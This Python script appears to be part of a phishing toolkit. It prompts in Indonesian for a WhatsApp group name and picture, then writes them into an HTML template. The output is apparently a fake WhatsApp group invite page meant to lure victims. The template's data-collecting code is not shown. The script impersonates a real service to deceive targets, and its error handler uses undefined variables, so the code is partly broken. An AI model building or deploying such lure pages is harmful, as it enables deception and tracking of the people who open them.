#!/usr/bin/env python3

import os
import shutil
import utils

a = "\033[1;30m"
m = "\033[1;31m"
p = "\033[1;37m"
r = "\033[0m"
h = "\033[1;32m"
W = ""

title = os.getenv('TITLE')
image = os.getenv('IMAGE')

if title is None:
    title = input(f'\n{a}[{m}?{a}] {p}Nama Group {m}:{a} ')
else:
    utils.print(f'{a}[{m}?{a}] {p}Nama Group {m}:{a} '+title)

if image is None:
    image = input(f'{a}[{m}?{a}] {p}Path Ke Gambar Group {a}({p}Best Size {m}: {p}300{m}×{p}300{a}){m} :{a} ')
else:
    utils.print(f'{a}[{m}?{a}] {p}Gambar Group{m} :{a} '+image)

img_name = utils.downloadImageFromUrl(image, 'template/whatsapp/images/')
if img_name :
    img_name = img_name.split('/')[-1]
else:
    img_name = image.split('/')[-1]
    try:
        shutil.copyfile(image, 'template/whatsapp/images/{}'.format(img_name))
    except Exception as e:
        utils.print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
        exit()

with open('template/whatsapp/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP"):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp/index.html', 'w') as new_index:
    new_index.write(code)
